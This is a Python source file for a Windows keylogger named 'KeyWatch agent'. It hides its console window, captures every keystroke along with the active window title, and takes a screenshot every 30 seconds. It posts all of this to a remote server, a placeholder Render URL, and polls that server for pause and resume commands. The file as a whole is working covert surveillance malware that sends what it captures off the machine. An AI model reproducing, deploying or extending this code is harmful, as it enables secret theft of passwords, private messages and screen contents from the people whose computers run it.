import os
import time
import io
import base64
import threading
import logging
import queue
import requests
import ctypes
import win32gui
from pynput import keyboard
from PIL import ImageGrab

# ─────────────────────────────────────────────
#  CONFIGURATION — update BASE_URL before use
# ─────────────────────────────────────────────
BASE_URL       = "https://your-app.onrender.com"  # ← Replace with your Render URL
SERVER_URL     = f"{BASE_URL}/log"
SCREENSHOT_URL = f"{BASE_URL}/screenshot"
COMMAND_URL    = f"{BASE_URL}/command"

LOG_DIR  = "keylogger_logs"
LOG_FILE = os.path.join(LOG_DIR, "keylogger.log")

SCREENSHOT_INTERVAL = 30  # seconds between screenshots
POLL_INTERVAL       = 5   # seconds between command polls

# ─────────────────────────────────────────────
os.makedirs(LOG_DIR, exist_ok=True)

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s",
    filename=LOG_FILE,
)

running   = True   # overall process running
paused    = False  # True = keylogger paused by server command
send_queue = queue.Queue()
listener_ref = None  # holds the pynput Listener so we can stop/restart it


# ── Hide console window ───────────────────────

def hide_console():
    try:
        hwnd = ctypes.windll.kernel32.GetConsoleWindow()
        if hwnd:
            ctypes.windll.user32.ShowWindow(hwnd, 0)
    except Exception:
        pass


# ── Helpers ───────────────────────────────────

def get_active_window():
    try:
        return win32gui.GetWindowText(win32gui.GetForegroundWindow())
    except Exception:
        return "Unknown"


def format_key(key) -> str:
    try:
        if hasattr(key, 'char') and key.char is not None:
            return key.char
        return str(key).replace("Key.", "")
    except AttributeError:
        return str(key).replace("Key.", "")


# ── Keyboard listener ─────────────────────────

def on_press(key):
    global running
    if paused:
        return  # drop keystrokes while paused

    timestamp    = time.strftime('%Y-%m-%d %H:%M:%S')
    window_title = get_active_window()
    key_str      = format_key(key)

    send_queue.put({
        "timestamp": timestamp,
        "window":    window_title,
        "key":       key_str,
    })

def on_release(key):
    pass


# ── Network sender thread ─────────────────────

def sender_thread():
    while True:
        try:
            payload = send_queue.get(timeout=1)
            if not paused:
                try:
                    requests.post(SERVER_URL, json=payload, timeout=5)
                except requests.exceptions.RequestException as e:
                    logging.warning(f"Failed to send keystroke: {e}")
            send_queue.task_done()
        except queue.Empty:
            if not running:
                break


# ── Command poll thread ───────────────────────
# Polls /command every POLL_INTERVAL seconds.
# Sets paused=True when server says "stop",
# sets paused=False when server says "run".

def command_thread():
    global paused
    while running:
        try:
            r   = requests.get(COMMAND_URL, timeout=5)
            cmd = r.json().get("command", "run")
            if cmd == "stop" and not paused:
                paused = True
                logging.info("Agent paused by server command")
            elif cmd == "run" and paused:
                paused = False
                logging.info("Agent resumed by server command")
        except Exception as e:
            logging.warning(f"Command poll failed: {e}")
        time.sleep(POLL_INTERVAL)


# ── Screenshot thread ─────────────────────────

def send_screenshot():
    if paused:
        return
    try:
        img = ImageGrab.grab()
        max_width = 1280
        if img.width > max_width:
            ratio = max_width / img.width
            img   = img.resize((max_width, int(img.height * ratio)))
        buf = io.BytesIO()
        img.save(buf, format="JPEG", quality=60)
        b64 = base64.b64encode(buf.getvalue()).decode("utf-8")
        payload = {
            "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
            "window":    get_active_window(),
            "image":     b64,
        }
        requests.post(SCREENSHOT_URL, json=payload, timeout=10)
        logging.info("Screenshot sent")
    except Exception as e:
        logging.error(f"Screenshot failed: {e}")


def monitor_thread():
    while running:
        try:
            if SCREENSHOT_INTERVAL > 0:
                send_screenshot()
            time.sleep(SCREENSHOT_INTERVAL if SCREENSHOT_INTERVAL > 0 else 10)
        except Exception as e:
            logging.error(f"Monitor error: {e}")


# ── Entry point ───────────────────────────────

if __name__ == "__main__":
    hide_console()
    logging.info("KeyWatch agent started")

    # Background threads
    threading.Thread(target=sender_thread,  daemon=True).start()
    threading.Thread(target=monitor_thread, daemon=True).start()
    threading.Thread(target=command_thread, daemon=True).start()

    # Keyboard listener — runs until shutdown
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener_ref = listener
        listener.join()

    logging.info("KeyWatch agent stopped")